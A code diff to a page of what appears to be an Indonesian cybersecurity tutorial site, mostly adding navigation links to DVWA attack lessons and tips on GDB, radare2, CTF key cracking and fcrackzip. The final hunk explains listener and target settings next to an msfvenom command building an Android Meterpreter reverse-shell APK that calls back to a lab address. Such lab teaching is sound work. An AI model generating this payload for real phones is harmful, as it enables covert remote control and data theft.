@@ -197,6 +197,15 @@
                         Vulnerability Analysis </li>
                     <li class="chapter-item expanded "><a href="../02-cybersec/dvwa.html"><strong
                                 aria-hidden="true">2.18.</strong> DVWA </a></li>
+                    <li>
+                        <ol class="section">
+                            <li class="chapter-item expanded "><a href="../02-cybersec/dvwaci.html">2.18.1. Command Injection</a></li>
+                            <li class="chapter-item expanded "><a href="../02-cybersec/dvwasqli.html">2.18.2. SQL Injection</a></li>
+                            <li class="chapter-item expanded "><a href="../02-cybersec/dvwaupv.html">2.18.3. Upload Vuln</a></li>
+                            <li class="chapter-item expanded "><a href="../02-cybersec/dvwaxss.html">2.18.4. XSS</a></li>
+                            <li class="chapter-item expanded "><a href="../02-cybersec/dvwaxsrf.html">2.18.4. XSRF</a></li>
+                        </ol>
+                    </li>
                     <li class="chapter-item expanded "><strong aria-hidden="true">2.19.</strong> Dasar
                         Pengamanan Server </li>
                     <li class="chapter-item expanded "><strong aria-hidden="true">2.20.</strong>
@@ -408,8 +417,25 @@
                 </ol>
             </li>
             <!-- -------------------- TIPS -------------------- -->
-            <li class="chapter-item expanded "><a href="../04-tips/index.html"><strong aria-hidden="true">5.
-                        TIPS </strong></a></li>
+            <li class="chapter-item expanded "><a href="../04-tips/index.html"><strong aria-hidden="true">5. TIPS </strong></a></li>
+            <li>
+                <ol class="section">
+                    <li class="chapter-item expanded "><a href="../04-tips/ingdb.html"><strong aria-hidden="true">5.01.</strong> Input in running GDB</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/radare2.html"><strong aria-hidden="true">5.02.</strong> Using Radare2</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/ctflicense.html"><strong aria-hidden="true">5.03.</strong> Contoh cracking CTF licence key</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/irdeb.html"><strong aria-hidden="true">5.04.</strong> Install / Remove .deb in ubuntu</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/isqls.html"><strong aria-hidden="true">5.05.</strong> Install sql server ubuntu 18.04</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/fcrackzip.html"><strong aria-hidden="true">5.06.</strong> fcrackzip</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/ipstatic.html"><strong aria-hidden="true">5.07.</strong> Setting IP Static</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/https.html"><strong aria-hidden="true">5.08.</strong> HTTPS in Local Network (Ubuntu Server 20.04)</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/resize.html"><strong aria-hidden="true">5.09.</strong> Resize memory virtualbox</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/fileshare.html"><strong aria-hidden="true">5.10.</strong> Membuat file sharing virtualbox</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/itcareer.html"><strong aria-hidden="true">5.11.</strong> IT Career Roadmap</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/monitor.html"><strong aria-hidden="true">5.12.</strong> Wlan Monitor Mode</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/vbox.html"><strong aria-hidden="true">5.13.</strong> Virtualbox</a></li>
+                    <li class="chapter-item expanded "><a href="../04-tips/random.html"><strong aria-hidden="true">5.14.</strong> Random</a></li>
+                </ol>
+            </li>
             <!-- -------------------- Akhir -------------------- -->
         </ol>
     </div>
@@ -495,6 +521,13 @@
                     </ul>
                     <br>
                     <hr><br>
+                    *note :
+                    <ul>
+                        lhost/lport : sisi client (kali linux)
+                        <br>
+                        rhost/rport : sisi target (server)
+                    </ul>
+                    <br>
                     kali linux :
                     <ul>
                         <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=4444 R > /home/carloz/app.apk</code></pre>
